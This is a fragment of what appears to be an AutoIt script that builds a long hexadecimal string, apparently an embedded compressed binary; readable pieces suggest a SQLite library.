    $sHex &= "CE9FC2EE58034532B9E22607BA05C7CAFFFF020ABC00BC01B000B003BD00BD02BE0193042AE8B05B41C05E080E9301A0026601F18EF7E66A06C209C401020046CC00C5036EB6EFD87AC5045ECD01CD00C60202CF00CE078CDB1F579D009DAAD001D00603D004FC9B7F5B4E00D10203D102D304D300CA03D604D602D701B16077DCAC00C803C900E2CB00CB06F78B36A8723AC700329307D905D903FA5F805F0D5606C201DC3201DB00DB037DCE64B6D50201AFA20B0EAF05C49EED981217061AAF040303BCEB9CE8DE018E075BAF0A0E047DE7EDEF03DF01DF0A05E001E03F04A56F40F30205E2042600E101E100856878278400D803D81E0B0A000EAA55B7B30203BB05BEE5004E33D1B0DD159F0607E60103AA1E9F7FFEF6E801E702009305E90BEB0102EB00EC0103ED2F4451D100ED6A006EEAEEF001F0034DC1FDEDF100F10602EF07EF08EF05028E04BF18A7DBB90103BEAE03F300D6ABC4F69E86D603072606F442F51604D3FF3F42F607F701F703F800F802F901F9EADBFFA28B06FB04FBBB5245494E44455845065343DBFBFEFF41504541434845434B45594245464F34474E0A473C504CBD51B8F941494E53544444416A4153454CFDD98E824C7D46546080464552527B33FBD61D4C325843455054185C9654494F4E5ED977CD5A55184C740849374C555349560EEC3DDBAC16543E0E504FAC34539852D85D1B34D7D052919E431872538ADF2E05FB3C4F46463E5E4F1C5259554E490B6CD0DA51554659AC5456842C4752C1B582E74F55504566471A4E7E0CC1DF6E03401A545745944F544E554C4C49A4BD7B0702BAC044365414E04F27F8299C2A661D4344EA78EDCEDC545F8B44B1494D4D12491C4AE060B6394253544D162A0CDA5620B89E4C595A6E144722424F2E56669AA0C01E1C530C12556A86F6CEB449E848069E4184413C1374B077126C43144B4116BA3E07F76E5554A6F04DE41454554D66B083DB204F4D7AEC468C1A3C0C21104ABC2D8CC3C1CCCC544C9CEA1004DB6B9AD9203C268E544450B060FFC176494C460E4D46D6474C4F425949463ADCC14C60F1425A5492A606D630304C18CA4818F6B043532886CC0E579CE2DBBCC0B0248A904355554D455718A5D104020EF4445937CD9018B865724650D249DA6FFE6F182A0C4A0F007151326C00137600746F00164809FF0DB261E6410600305662007361FFEDFF6F1A2C00631800110077311700056A195C2079663878351C33005714FEFFFB00601A005FA85B585D54690E2768004D0012556BD841BC530C4C6D3A2E6C5A28FEA6A80882242C1D3B3C00143900348690382435EB02A109A95C0D072147E2CA4D94182B032F1E0036D7F6DDC96D013E443F00293D091F3710220A2185B181F80B444BE8645ED6"
    $sHex &= "23F16F5053BA006E1B25454F002315666F164E0705D8050306070406BB6D326E0808020690030A280B060236B57B7F7F0509060909070A1C020309043606042A07EEB5EDEC52024C6606060C44046807328437F3EF983C0703070D02540805110CB37BE7320E5200027A2004D056B05903066A0903E702085E8311F4CA0E83A619021D70160E0ED824AA2EFEA8163A74D23B3A41BE450F0623B04E9AC0CC60D12C7518FA69A6757D817491828000885298009F00A2C207F8F902A500A7AB00B052B800BDF785C29586C500CBC6D200D900DF03002E2DC0E27200E942B8C996AB06F46A6E0501110217AA584E203628012D03770137EA36013BCA46014C35500914DA55565EB277E92E7D69016B01729676017F0E89018F75E93509D69C02ACBABA23D0A10E5EC26ECA9618E00E7DD201D501D772DF01E3E642B84B0596F466FF0104FFFF2BBE7E0F02130218C5401B8A29512B6534226E2D2E3102308CFFFFFFFF281874105F880B6D8972061D685F8B3809140D733C66607F36356C1515446403C5FFFFFF217C7B6B055F0E474A1333623124206A865C11422A0878693204DCFFFFFF7F1C803F7D877E411E394561670F4825260A275F4242630775466F2C775F3123C269FCFF12497A3A5F5F0C3B70793D3E2F713F9B415828A024860F84D80D083170CD160AF71F0998660106C7EDC89E110701071F70FC3006913CCFF3DE0E640680A0B4D0CE9E67F3E0FD0814244FFD48F33CCFF306648498B0CCE77936CFE4F8FE0C34542233719E6C8C262CF40454FF1221354E6780B2E42416720365CDA40E660AA265006DDEC71594216C26621E61D7EEBDFB27200A632A6E561E6332895D3B50EA16641A9BE33DED9E7371224E6E659F48C13D6054079DB6797494E868F401A861347FBAF6363BC950C3E70337012490FEFF6FC1F03F92D54D06CFF08044A0C8EB85F3CCE105F8E7E2318070999441616A27F7B7FBECA0993E6FD476406601865E1F88D5E10F6E67737C40D07D3C41798F4FD297CF487B9BFCDE0FE03F1FD0769F4CED4F6D9B9DFC40774B41BF0F1C4F343AFF7F7BFD8C30E28E79459A0084D7974133A7A8D523F64939176E05F8DF56FEB5B5B893469A99B93F7F431D5A643BDFFF4DFF4F6E21CF9F0859402E9F87A2AE427D54EEB62B660F6D9E06F4D32E5FDD07652B305DD21FD20000C07E0150414C80BE888FFCFFFF474149736F7246655665A3A494CC1E1AFC26772F72FF45524E454C333269AC514E414E0F494E46E658BE9100442F53D0010EE3F78A07A006799003745602D9CE2049543C8BDF36E98E8E0FD41F3E1E7B92815D24F97FD0D83B853C24F627DB06EC3FEC447BA72AAE06CAFF2DBC3F06E4910CC83D34B42403F2484411D813ED447B48C5FF49063F536BA7D8"
    $sHex &= "B57F178ECF554117F01EC8B04D4F8C5AC206C614C13BC5DF623206499FB11305EF64EB06FF5F663E7F4806F64E669C06A07FC019D889F66896BF70723FCCE444D12374401F77B08213C9897A0C7CE5BF705BEF2307283706537D552154401D22904440920DAC02D701A23E06B119BF7F1606F33CB79302030F041805CFF33CCF0D0609070C084B6E2727090A370BEF76BB75AF0D0F0FAF1027110612723BE9262F21351F41DBED7672435067522F530F1CDC6EB757BF59F76C2F6D56206E27CFF3701C72065F804E6EB70B67810F823F838439799E0B1F91299EA15D70723BA4DFA7B73FCE97343CB93FD71807660C106CB175592F0F2F06B5B5503F5FE355B5D53F013D4C237F1F2253073720080F36F409C8F2E5C8910A3010041135D412478E1C39B01384184C19241AE4C8912F34EC1BB41C8C1EBE7C39726C1F082033D02132D822C891234738782879187AC9FB72E408FC04FF31F4FF0000676738B0178070CFF0F12750534A5AA08654497E44BDF6B90D0607A388C8FF01800A76EE9AA29D030F788D795D00767CF607EF1E7E3BF33CEFE45A9706B5D4F3D8799EE61101304E6D67D37CBA6A3AFF77DE9600B43DEF29CFD3F24E2F064D6C8ED81114C11001004072845C200046C40206A9183110C83F9955470228FF071C023A561507A5C9B78F018C08A4032C6082798221AE7CE4ECA6DF0FA1A5819FE0FC407E800E51FC5DA85EC1A3DAA39981FEB9809DCC0F40B55F4114F2FF3BB6BECFA2E4A21A00E5A2E8A25BC9B7DFEF7EA113510506DA5EDABE5FDA6ADA32AD27DB4FD3D8DEE0F972317E073C4571A1132D4337201808F607AA281F0157D16CAF1D07AC173AC8063F50408B7B6FB776AB407E305F0ED7B6905F04AF2005931977799E77763CCA8F42FC06F8F4F0E7799EE7ECE8E4DCD43CCF7B9ECCC0B45EACA09CF33CCFF39894908C88CFF33CCF84807C78747027CFF33C685C544C44799EE779063C34282014F36C9EE708040041F4E0C80ED6F0D4090427E62E0FC336D42E7E080DEC077F0186252DD6BD8777010780E4012E586464F401DEF46D2466317D454EFA13BA861C5FB75F4DC8D69018A872306A488067905F52AC80ED66BF3D55544812345341461F0A085BB33649465F00AC0282238400FBF8BBF6DFAA2E756E697865702068177463007765656B84BF121358ED7374617282309027477E7FE76C673047796526374607686F753F3341781FB87CA073656391F6536B52645F253034642D083242BB2195203A3E21B5CFB2C45F3F8F362E33661F2BF9D9B10F333F2E31366700027FB9D86C6C5F346A756C6961E106836B3D9E820006F9B0B7351F17737472666300AB800AE472325F1F51D8DA87666D7027A724435EB500275CC025979CDAAE783F86E084724A"
    $sHex &= "2E3987708C8800B8E4945C947F30A0B9645B0CA33EB310AC5772C929B2D0BCF06F08BF25576661A83C1C4B0812F4FEF068EF382A06752062790E73C34B6B8460709C794F1FDD7B20214C697A537095FF53845F76B64E614E002D496E662B7507C96D0F0D381728DFF1CFD511293F393232333337324236383534373B43F8E0373538FA415049612077426862081AB473E19C107AAF62056E657041F80CA370D5CF109CB6AF5F246505596B1F773876826914D29F41FA38476F6A0F737562B9A3C3F12E72026EF059696583CCFE7448E249664E75E2175F8FDD9780AF0F3634C6E1BD919953A4784B00423504B39D50942E566120AE0ABEBB174D6F760F430C79AF562D24DC1152A152BA7243F8E6377E536571004633DC6F4F0697E4416464496D6D8682779B0C6A4265EA6F1884EF0DE1416666DC9F50EE1042334E75478E7B609B8994F4DC4A750E5F66070776F69C93C72AB2774D61825FF7EA6B6552FE72643F75BF53615ED7990F0F8D464175A65483049B3E185472EA73613D0660339CB7645E6F6B69656E15EEF0D8E6EE6566791D004FF2579D7BB26117573CB917B602737CFBCA6465781F457068847EB8F2832B6E1F50B275646F2E6C6F736519B93D80CE4C740F65471BDCB0052F6F4694E7862078D811497355E48350C2E6CE3FD69EC599E15E73A728E42F657718846D178F38CFE472740F2E0A1C33EF442CD2656FA3EFB7C10E59604B65790F441A102C3EB600811FB398732F9E28E76F9B773E6FD60919215276E7782F7361BFA34F624130496478F517E50337056F173773BB8F0E37FABE114E4045718E682F187D0E0E472F664C5427C5C1BD33E4B40FCC1668442C60985974500617522132356FB4FE645312A27021E163C637EE707C60BF344F446976F8F76D61FC5E3F5A67729F6E28CF47451C66FA88D127385EF881C50A026F797EA1436976F125E68649E3175410DC05F645503AE2536368B4762E2B30481E5861E888966DAFBD73EF80704B177B2F3A54ABDACC671726EC746B3072686BFF1C930017C1E2ED63FB1754651B7C9CCB201FEF0A466BCB9ADC5D9992175A5A12A89D49F02F4D203CD822506CF6EC9300974ECE0F4341FA6AB03309D4520F46696626DCB4E0C78A636B794ACE69D741752CFC701E63755E14B687F89F63721708706972659D4C7060BFF06E7F420CF77066C4780E416E8941734E2E37290FDA6C5B8EE7B5AA56A11F3F99DC0E04EC562028865570646A55C3E0CE4A63B7C157C5D186D9506F3F061F48B8C56CA01EB6645F31B79DE4DA333817393430766F54C12B7B07B00ECB0E4EFCDE9FE09EBA63AF6F470E1B25732D7328B4A2D0686D7569DC88098C6F8FDB7B15D207B06C71735F165C157F23094F6E73CB20307825782028E934E6"
    $sHex &= "C025757C5FD2E129420B0102C4240112C02F377FB602BBC000BEE66D9BBE06A2F01668D00E90BA30E1406CB667F30630E050102E4D00B9E006D223DCDFB03ACB3A2B07645F8A6AC117770F961EAD098676261C250466BED89F25287CD157414C10067664264E2EAF8F40812342955C0A37207780B011816E75628AE09A206A2E32E6AA66AA0AF74E1850AA413239EE11A446465E7456D9AC00378870206B243D3F4229E16642B8202BB6E23720E2D65E29BB3D28182C042920676E850F9BD2178764C40A04AB2AEBD7737C1A73A69570A10483C1A477206C389C271A8820E337D415B4211727667474598EECF5B6786565651EB6239BD654ED484A628CA66E515011966028215F6F29E12DAD97C44D252107852EFFA10D90E0B6D16AB8495DE1B013AA7928291A9673C29C5DAE4F204FCE53D97681ADC032226CD77718139C716020F675892C30ABC00B0628705869249A0AC1EAABC8733F29CEC65362B135D844C0680A6966421170D8EEB7C6BD27A4D89D796FCE5ECAC70C502552407E12729E87151E28478A3E50B09D1A4648E94715531C2E50AE4A7B819247B1F76178B3C4ED607B435472757043641BEE5B4274AF6AFDB01D1814FDEF1ACF13E664E27B72874D10D70EA266F772166DD40A8EB1C8F35D3B0070EEC416CE6AC55EBB4D61EAC3DD4588111E4C0C75F4F149E0297A7315A3571442070E6E65DE124B700617E9936354699F9F70473D3DE593E1C738286E6447A7E13A1DD5C0172539147251B80A693684085F93EBB996B000B9439FAF3762A4BBE52873FC19567667E27090B406114169AEC16D75A476266989F06390D28F212E3135803B3C50780206288B2C2E04CB0D60007F2C6E6954DDB96FCD58BA71362E32307329F74C0E6D6D858E87645F271FF7C173E028622C5676443A25700404C5CB00A73C4E1D24A0607F5D9F71FEB7C2BE8C162D6D6A25303858140CD074D265586E43B9048B845758949D7CC3468D00FF1803D52F0A628A01204087E2708FEA10EE3A27C0DE58AD005F1E550C3C2C2ED00BCF802CD6150225F7F97363541467F05C23A270001573CD09230A0637706EDA430A1FDF9A7379DB58A0D6B1BC5B805D374CBBE1A83727302A71270F7A0217062ED22B0B768C3C1CA62776302737060F18094AD8FD32B1D170F6BFCA308747230A0D2F773E6E0C5F0DC1414046EF202D203848814BF667E19A7953B87B3760347574BC3401A05FDB7672183784E8368C1611ECB691704CBF3EBB63153682279D364043B070EF7763A3B615CC65736F7DB0F318EC61717756292F0AA36047208282D5606BA31668A1C0F9275300149C7154BF731F03A7668E41125867021BDB8E263B00271D0127031FD623537AB7C9402C231254204587E3C03020B6B22E22B02C1C"
    $sHex &= "AC353539BD71373320425958C401E01AA0A8A06E7A6CF21AA891331E3DD5E2451AE1D0487301CFA60A16E08C5E6FDF3023DC416DBF36A0241836586F9F0507BB11EF0CEC27C51D8227D2E8B5006F4C891E1D20DB7395991A30A2BA448797358550B4EF2BB6437B6FF5E13F65772DAD39E388F763F52A222C2230D24480007700A7236CB7B65E877A659F4B6E2050775A5C9FA181D4986F72876F3852482CFF322E1681BD0B791C0F6313087A0D388D6E4CDE0E039E4B8958F6613C0E475707A6EE67CC67820F5FA1E07A877E6D54750F1FD910BE237357B6C0BE06EB2E05001F1740D0B0C89722C668A8205B0C58105747580316AC1F0F9B5B1BC105CE7328292773308C85408D86C0AC6E3385F71983C3D40594BAD18900922638AC540218A8B9CE1CAD5C10B2D39940814B07ADB6322C5EB5D3D06E572572854717E29D445C6DFD72C18C300055A073A228680AE0094404741A82312FB7A6562B25976FE786323CA6D9636C70AF0BB7ED7D2300C739CD648A3BBCC362C28274368C43D4BA2CDC8E25B5C16A271C7CD764D1A4595AA6E23F2581488643735E0A7B824BAB9187208F2755AAB837630E730470DDBAB85CFF3A77828087165B29C9C70CEE1177C866CDEA5410EC894FE3F9696DA6997584CC8DCC7677D7708815EDA1B93F8115D80CBB3F56E7C8B0366CB871732F61464B4D6D1BA2D02A3A87F749445F000DF70A3FDA888FC7FCA1EF672BC7222FD78DC260B33314CECC326C79473E6005784CC36D2DD8E56C21F3007B667722D8BDB0040F1B17223F68A52990B7729B5F655468073B270342EB1AA157056B935C0730CFA8C5542E39B5603FA52074034EB9E481A6408CE4DB7A60850A510093201B2E1F6E05843B1B3072C5911C17F358507982B0C003DC6F27E96EDC331E1C6B751F72C3BD6B580C0F005522E101A33BDC7CDE9CD8090BB680D646353C0010826F752002002738FD3CD21B60D809673D20B92828214CE8DA2CE2510729959885624FF4DF7EDB4077009024A14EC37D45BBDF2027CD2720542B710FC180051D29454C7AC2DAB1D5734120844410437B07B737BC8715F53DE065B6BD2773ED4C3355809B60018A2ECD61BDCDDA2B8F25255641BA79259CDB8EB679555F307C7CA70A4BAE010A66D028B1836730B8FA2B3138468BD35AC1B78E0DBB9DCB2847ACAD3D06F2ED1F0003C530792937732C162856EDE7375B308607AC2047091F4815A9187FDD281215EB75590FE90AD7B18D43FF9803C0AB52648CD920B055700118693F16760560113537DBA800248D3F9683B64CC5406E2D1F98171EA83A6186C9771EA402B0626998BDC4D673613D6A6F352784B6D1934074A816308577471FB13E7CA4618B31773B0EC387882796A57C43B169C75B3F819DC441F1D8"
    $sHex &= "63869D00820457E00F95CF9E380303404905782F05AF618E5F7FC242186384AF6608E7FEE62C6964782C211CDF609EF4B51BE6737AD7780443672D5DC0016911C1506172A9319A00BFFFC5D6626306DF8351846338ECDF09935281CCD26F444A04640C966AE1E3FA2DA79E5D024883CFF5ABC6228C47F3B3EB80A540A7C203ADADBD704E3C3F392FAC82B7FDD7152537845E387AE17303805A0260C2D211761606177DC063620211BA0F5D16E3035B4FE117409482C129E7889C8655CA1D131F44451D074A85D177DEE4B42CBF1F61745C251C07B029ACD3216F82210C401FC22734D66A2C2F5D6CD15ADF42832E6363596FDD9A71ABBB76057478C468A147417F69DC58D4FFB7B8F134B61D1FA7875B037025176357B3A6E27FA10027548E32840B5729B51DF4681E5473767EF4C2C3296B7D6E7BC01B44B7B1F16FA357DB89EC4B69E9C87126B7800AF66966697EB78B37704483189965DB3B446AC407EBE3C628C2E064183F08E265288F6F6475B060157AD165679FA46D342843EA45B80216E757FC672500C24B56235FFFDD6017570D4F65EA69FE1F02DC176D5746478141801B327360379E71A80113D08AB0DD487C577D0B0E80EBF76C5DD5844CC605792C57019D33956E16091729983F108947B6544558547ACFB922004D47D90F4E4CBA178E54CFE7690E0107012127B095F890A5EF54D76F08F68511D1185A21268406412C5BA1A57E94093D232564113D07DC9556D9812F0F1EB138461741BAD49AF11A29B7980060556845972DDFE546D0F373FF0FF7636972D963618E635462766A52D5B06A18C80F0760523082C5B264B54170C2A6C6F9B7F307D558DF64726F7070E1246001F6DA72120EB05B4E6455598C3DAD850F47E1071316AC45FFBF73562C080DDD8B878A0A21A8F7673F460A471D786521852A8C183987E242608B8F3D0B2A57E054F73DB74A071621473A0873C36B5C5B2851544B93C628BB59A94E58845A0FE669046EC0673013D7960A64C34FF7D147E811DAC3F9693D4CD1B6597F5FA17558C74B29833F4F05382E8CD92667120376B49FEF31A8405AA0F7497F12A402D95D7D37146851E014F7FF5815C92C44043786C1022BA73A2A2F1CA840DAEB9666186201B710094F4E206F427864D4FF1A576E2C82D28157D701DE026EA6E5161080E0011780450FB803DA4FBF6733E8B3EB28EF2C28050218742BD40CE44705DE0A04F753DC116F2500091FA31C8267926F4CC07F02391628A948FD6DC46A252911D502AA7529478F45B52A50875F0628265F6964783E7E1058EBAC53CA262C52D41AAA1FBE40E01C089956DD6E01762D0E67246B19088C37D3370861A118C7D4D171286CC465256B0F3B16850880479460B04C158F86882B0521F2BED34893D5CBC52C"
    $sHex &= "62ED4FB0AA1655C7476DC6A2173C45974F33BC9B25794E3E633D74FB059AB013B97473A7DE5813306477147C016B02A7220050D8D204D74F864466858FEF1F82C0C150B11CC01315C272787458600712065BC6D2EA8A8033EF3DD88905C0B2AD5910B0A330344A4C20240EC4F68A0F812116EC20F7E62E489C11A70EDE00D2B605D70F67770F3F2DE45A07726D0F7269D6C4B60D0FD707121861C861780E5A1302C166666EF808B3694F710F610CA6384FC79E870F75D872188FA9317C376150501CAE98581768749A618606A50318649A0F1895B9143B333E0F9130E6703AB11FD5118940F55F69C7EB07A08728B6C55FF0E8C3106237E01F84AD0CAC066F346FC89418788F4ECB5F86A9B60253E3594644685F1B0866203E873EF2141129560F07465F8C766078C664471F206E9535766D8FBF766700C21E866DF70F679070C6A362B5277B1FD77905F06E0F01030F92B03685740FD97C3F02847F19640219028C02021964029403604CB1659C3FA4B5C7684C9F08195D803FAD760B8C5F3E016F7B689F3E97013F035C600642C0BEB42013C82001B8C82013C801BC016CB06D13C03F31BFA2205C726A97C43F4B70CC72C903A9029E50D439B529A403DCFF6F805C724A2EE46E10E832B529B63FF0BF9D4E726A03F83F9CC0DA0056DCDA48013E6FAE5D71C43F147F40BF302E39B54B20FF98402C471B620BBF7F30FF0225A7E4DA4A10BF389C508105A2C9407FBFD52636924CFF543F904732B0FF64036F72C9471B783F049BD094940C045399FFB025571BD8497FB83FA08A965CC9CC707F6015ADBD95B03F3FE4941C3B3A3FEC6B60ED1152B9F802DB087F42DEF61B479170066AC03E189E2BE4B9101C6024CFB7550BFFE70702EA90306CDA00797E283F30BFA9BCCD0703806090F03E38026DE3640A48035A1A361C167FFF3E58BD2B794E0198609D197B628A3F6897494E0CC2E090CC9F36A90AA285E9003FC2A1106A3F366F261C0A874F57F29509146A67F753255A0A8F43276275FE16720AC7C5C030DA13CF24AC6C842FA0D0AE5DBA69009FBEE089D497A7370C62B8F4FF2E51122B504A9927766E8BB4FB3FDD20178B4827D6961A910CDAB65A171DA77888C500CFCF336A9C745CED5F7EE79A303186730E5C269CB736630397BE7541E4151D2D896762C1577F4844260E4FC182EF48D699A06D1C6320138A333031A75C894443BBC6E73A6310735C816107C9FE486C0F70906B380A2E66637270039DB5C7382E27D008B40A612D910A3935509AFD296E21033FBB3C942966C75FD95F19C4620AA34ACA29C22F95B047FFEC74795FEE82688FCF2C61DB30100DCC0A3A6710304D5F09C1B36379C76673798A4C988DE16F84369A04E6D4E146AEAE541AD1A1A6E174675F93FE5397"
    $sHex &= "71A70AE8745F09C55B384A5F52A36AF668987C3F701E5FCE7D195FB26C5F15C8880CFA20B70F6AB881294976DF7368AD778E375FAF6430B381B795172100C506A636350051BE0D6CA07F4F207F1A6E3DE816DDDE54208CC640986A41314637C675745F00A79E8C1C2DB8120C0E8917747E88F65660367836173015F10A34D817365F1FC00CA676211F73C71A83ADA5B61D1F57171D11470E6D365F1C008CB6A215173F4783514B65CD1F7591600B535F3A10270576696CEF5F76F91710C3B015EF25005F23E664A8690517170E970C067CD00BE1F895622F9F20BBD1C86AB020375F8D6883390803F62A17805C84E1536166C033D201ABD62D077422D1D1E448FD00890805066FEC9EEEB4C04339C5FF1F13098F3D3964665817707369CBA96B376F8A4C16469658007F3F98501B30F63F2F6FC235D8B6D14547C79A560BA14F8F6F02207BDB3BE66447BFA4C181D7EF973811BD676312EB171FE06DDA8489964E45E785AC1ECC27045A7451C529D702A8698F156C689B155E690A17372A00A46FA206E120240A0040693C609FD663B889B8874B2A9F239D88C70270E04E0DC2E1DA383F6FE68BC9DB0D81D75446380F2D382FC8EDE03136ED17622DACDDB27B0F24372F00A75D192B5C37544104D820842FC7CD5A9546A5FFAC721B856A9C46879FC55E692AD15FD3731F46C870800F63D762A839651FF7273F9A7861F1676CFC303C5C098B2B3FE62D10D824186D8F5D0101B0D10F31266125561F371F8440B1000710DCC4728820778191B889656FC4A22642810F3B6BD47F9834130A671905883F56E779AD064ADF31063233B0322E9E3435BF4727614D4E8BD748BA8019046C3720C7C540204458B56A9AEC0E1C81D70C54045C8023041126F1218C85960B46B80BB0002C170D11C8218DD5151016C0986897563802BCCC83ADFB68EE049CC8B09AF4FA8C92B000B1B713115F424B4762E24A545CADBDF34D0571575FDAB9B77077D97599DDF691139BF1174370C0BB6F03ED8CC7002E84157325BB81432C25872B0A5B7116DF36DD663ACB255909C579F014420A00BBE79530B622D50F8F2F6C0C6171204199840B37048716D860DB37FD3F6F0766E2021A3A2F2BB0580C0C83FC7CC0E0F4B66616E9D79835840B2400BF59213019212F0B110F43A8DBB01A5C40171743EC56A4E243A46FA7258D0D2B06D98900AC2DD8A16F0FAA8B10D8BFD773DF503D819145795F25ECB6C4286C874F5F895502EF261D835837B18AAF0B2326164813950A82835D39A3141B8CDC80221393386075136F8AB162C702D83F678B3000BBE79CD881D998A729BF74778E13DC1861C987AA420AE305BA231263D5F8B7973F08A3909895DF5CC6B6C80F4BAF853067283377EDA0061C237B006751A44A210B0F"
    $sHex &= "30B84BB09F9D737973465C4908817F011E892D57C64146546F6868E732D6755753004FD6954AC26900465FAA035BB6C7611F095103DB7557D5C036008B5B256197F0302C27F718891578F520CA29007F6A6013315F9DE0205BD167438B34A61D88872D2DDF73882B5D6AB7281FB8020CF4A3B761A12709A3775368222245F341273FE3C166DF8C5320C95F649210DAD8623B3F2F98664CFBAB232E093D8619304A0CF720C4358C12913BCFAEAD52B0A69F9327D07422244131348C202131189EBB536B8445484C3D67DC4428B8745D27868482D728DB3E300F60517021D30F764DDC880D26EB9D084D4D24E2CF8347ED4271DD3231EDC1565BB5DFADEC20B415ADCFCFDF493C0B4BE47123B28BF049E12AF12628D24EB0513B27412BA8E24984962F28588710676F20084DB01C4D291CAD02175F012F088251315F410A2253C1433B2F170B8EB68F202301F1403C10DDD74314B78A63008B203016184CBB6A714F56EA65952C20200687D5A912424462308F882B88DCF17F5483788B3A9FDB210EE2A8A530A1BC07AC02599676A3ABD6BA650D4526043A624764B4B61A8D38EFDC72C36793E612EC6838261020211AB50287367591D6A4D5DEAF2F27510BF432EEC7DAC69EF54F2D35270F5D42880A9FA7B7A486B6B27842244D18825C9209BE41368CD29EB96C18C2F040C387BF4C70860736C775D6ABC4133BB7B27D0F24C48A00B18F60C291F863175749544820261B4B80558E4943492F1B9B7547DA574E41204DD6492D37DC6664313D372D1C6F8DC4612FB7C698625BA16EA730E9456C7D0E625897F0C2EC636BC9332CD4D0967F224811042B080A5422B0AA38F1283552784B0F26794CD0C96F6E54126E6DA3DF0F0124C6408C611D8952DD280D82C15E3DC01913E12CF9092015560D2F8F29AC3102770E6C1041193377BD541B6D5A8F64A9086FE2A89EA36C33342EAFD5C7C1C38A2101CFA0CD08DD2CD86F676E636B893543AF7E3A4DA79CD718F16957893C651D356677A76406F6FF3F057F323031302D30382D32332031383A35323A1EFFFFFFFF20343235333762363035363666323838313637663162353836346135343335390E6EE16F103833386533613357633D1570A4DAE21918414F922CC9AA50B66829D95F5A08184EC03850BE30B79C750C72B9E76E77E9C8DA09BF12676963D262396425AF6BBD5B64EC9D0F8835E013E6297DC0172855D22A1D0F0AF50D39B145276E284D46C9CF8DD1750B9CB7C00148310B50E3A43706AA92ACE9D2B1220F978C6DC10546E81E492F4FCBDFEA35182F319467E9DB6CED76B5EE47224D4022341E01274F11012D15670057BC62AD8C38806F676764160A851034896D20253AA4B7AD6A20C17F27AC1B18C18F44399B38DC096B7288"
    $sHex &= "1536EC908C2FA5D3A312BC6E4EB67BB3A3C1C060DBEA67644B14364267ACD72E582B225A78666975F551DA9063D1EF726AE8001B2B3D4D814B0104DFDB1236AAB3B08E5B60CBAF2ADE383597B30744C4DDC4812F3369030E80362D3DAC2995B40395595DD451684F3A074DC48A4D00CF8F188D141BD9FFDB84476366B97F0F0AA1414352F24DE7D711AB900754CF0AEA200A3763815750F630E86C4A215BE80D544BFC30542485D8668F3D2AC43E56A7035383510B76DF37375047A5433B724B40113A3798BE98018B25E9E120FF35B06C9A2A4E0B40FF0324E0CB80BA184048C1CC7F20B990933CF6A0024017C805FA08F9900FF9409C0C50C30F24F412473EC8078096981620BCBE1904BFFFFFBFF2C91B8E34A1EDCCCE1BC2D34E4020F09EB5702BA8ADC59D6940D0FFFFFFFF5DFD25E51A8E4F19EB83407196D795430E058D29AF9E40F9BFA044ED81128F81FFFFF6FF82B940BF3CD5A6CFFF491F7878406FC6E08CE980C947BA93A841BC856BFFFFFFFF5527398DF770E07C42BCDD8EDEF99DFBEB7EAA5143A1E676E3CCF2292F848126FFFFFFFF44281017AAF8AE10E3C5C4FA44EBA7D4F3F7EBE14A7A95CF4565CCC7910EA6AEFFFFFFFFA019E3A3460D65170C7581867576C9484D5842E4A793393B35B8B2ED534DA7E5FFFFFFFF5D3DC55D3B8B9E925AFF5DA6F0A120C054A58C3761D1FD8B5A8BD8255D89F9DB83FFFFFF67AA95F8F327BFA2C85DDD806E4CC99B97208A025260C42575F5B0FBCF6CCDCC0201FB3F713D0AD7A37009F83FFFFFBFA41C4F8D976E1283F53FC3D32C6519E25817B7D1F13FFF3BFEFFD00F2384471B47ACC5A7EE3F40A6B642AF05BD3786EB3F333DBCFFFFFFFF427AE5D594BFD6E73FC2FDFDCE61841177CCABE43F2F4C5BE14DC4BE9495E6C9FFFFFFFF3F92C4533B7544CD14BE9AAF3FDE67BA943945AD1EB1CF943F2423C6E2BCBA3BF6FFFFFF31618B7A3F615559C17EB1537C12BB5F3FD7EE2F8D06BE928515FB4446FFFFFFFF3FA5E939A527EA7FA82A3F7DACA1E4BC647C46D0DD553E637B06CC23547783FFFFFFFFFF91813D91FA3A197A63254331C0AC3C2189D138824797B800FDD73BDC8858081BFFFF2611F686A6033BC684454207B6997537DB2E3AFFFFFFFF33711CD223DB32EE49905A39A687BEC057DAA582A6A2B532E268B211A7529F44FFFFFFFF59B7102C2549E42D36344F53AECE6B258F5904A4C0DEC27DFBE8C61E9EE7885AFFF6FFFF57913CBF508322184E4B6562FD838FAF06947D115ADE9FCED2C804DDA6BC8D0EC7D80AE71044E617003010C101E15144016C15010C82209009055081CF81222840003022522E4B82D0087CB180465E506174684E24CCD12AF6572341776212C79F72183DA41908BC125302185381BF"
    $sHex &= "8B5447014D61705689FD6E251E4F662A3C556E6D215EA4C27E5E456E641B9A2DE08DA4370151004F0176FC5006357B3509A34EAF01490D64E25A80D373C702CE434578F5C131B30FB6999B4C13455469188332F0DDDA476E3753C0B903F34542B6732D13412A52DD18EF74CFCEA9999189DB9F49A2D90D811B4328B2145324D87768634A6964287023121BF8546FF3427974DB1E167C136164AF9E53846570BF13841916CD5637A9353CC12C1C4CC476BD3085A90DD93832B75A33496C7841277AE056E19A52642957C783100846273C511012BB66085868414275A7808743ED5F6632923A0BE3681D127AD624371B1B509838522A16376C78A4CB97453306020304674412C333A916B953BA5721F03138069D5C7008522B20745769CF9E4C3C044FABA09789D1E9CF48D9DB4C48283A47C1B392D0078443237670109CE34964E341A79444DBE270F53D1C4172ED17D80D824AF24E5349B56EEA3D85A948006D136D8A774CF7151C196D0EA6A6F9549DF754F7301A8EC6246E8D542A58B0C157416763F4A0D18B68BB64F8E9C384819CE9930C8253ECA73949736278C58486040CBF13598A83410517B836F0224B0156130253B025A3198F4D53870D6BFAC5AC96FDB04EE36B74643759BBDAE5B04D852512999400425A7A74931AA4FBF67F1090B7B919DF2C538384EB4A271349EFAFADE860FF5F474465D89520203B27090612EEB754827B7503838361DC703558DB45D1C4384C7588A5B6E927F52F5F2BAE0B645757A105A74A13D653224BC11D56F152746CB2771C69503D16F7679F1541160F4F454D12C82D4C551D52BE435ABA0BA478B8AD414838357A38BBEBD543E6B2048925111B5B1706DC621D2D411F3EFBC8C1625B7B1FDA531D37C0188B417BF2FF3F1B220106383519070805040429261E070407F2FB3B4A0608660B1B072C212A327E44FB27625DF0D305F036110401FFFFFFFF07124F061116125006203711F04A03EB33386B065106242334060C4749050A19A9FCFF3418080646061B301C18532D6E0607089B43D2BF0C0905060A090B0C90321607B7EDCDFFF07301B5141C2320050E0709130A3C080A2E0D070A3B406DFF2A0E062307191406262495D2F0436FBFFDB702201A050F090D0B12130B4205091D060B05CC0A0714077F4133C1060E902E3A112665F09C030C33266EFF7FC13A458C010B08131D58DA081818571F092D1B9007225FB7FF6FCD226610640B09160B1A0C081015400D2A05221E8C0DF0F67FFB1D371